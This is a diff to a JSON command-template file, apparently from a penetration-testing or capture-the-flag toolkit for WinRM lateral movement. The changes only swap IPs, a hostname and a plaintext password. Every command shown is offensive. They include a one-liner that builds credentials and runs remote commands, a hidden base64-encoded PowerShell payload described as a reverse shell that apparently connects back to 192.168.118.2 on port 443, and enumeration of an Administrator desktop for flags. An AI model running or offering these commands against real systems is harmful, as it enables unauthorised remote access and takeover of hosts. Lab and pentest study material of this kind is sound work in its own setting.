@@ -12,7 +12,7 @@
         {
           "name": "<TARGET>",
           "description": "Target hostname or IP address",
-          "example": "192.168.50.73",
+          "example": "10.10.10.73",
           "required": true
         },
         {
@@ -41,8 +41,8 @@
       ],
       "examples": [
         {
-          "command": "$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;Invoke-Command -ComputerName 192.168.50.73 -Credential $c -ScriptBlock {whoami; hostname}",
-          "description": "One-liner: Create credentials and execute whoami/hostname on remote host 192.168.50.73",
+          "command": "$u='jen';$p='SecureP@ss123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;Invoke-Command -ComputerName 10.10.10.73 -Credential $c -ScriptBlock {whoami; hostname}",
+          "description": "One-liner: Create credentials and execute whoami/hostname on remote host 10.10.10.73",
           "context": "Quick verification of successful lateral movement"
         },
         {
@@ -51,12 +51,12 @@
           "context": "pentest flag retrieval without interactive session"
         },
         {
-          "command": "Invoke-Command -ComputerName FILES04 -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...}",
+          "command": "Invoke-Command -ComputerName FILESERVER -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...}",
           "description": "Execute base64-encoded reverse shell payload on remote host via WinRM",
           "context": "Full lateral movement with reverse shell"
         },
         {
-          "command": "Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {dir C:\\Users\\Administrator\\Desktop}",
+          "command": "Invoke-Command -ComputerName 10.10.10.73 -Credential $credential -ScriptBlock {dir C:\\Users\\Administrator\\Desktop}",
           "description": "List files on remote administrator desktop to locate flags before retrieval",
           "context": "Enumeration before flag capture"
         }
@@ -101,7 +101,7 @@
         "ps-winrm-new-pssession",
         "winrs-remote-execution"
       ],
-      "filled_example": "Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {whoami; hostname}"
+      "filled_example": "Invoke-Command -ComputerName 10.10.10.73 -Credential $credential -ScriptBlock {whoami; hostname}"
     }
   ]
 }
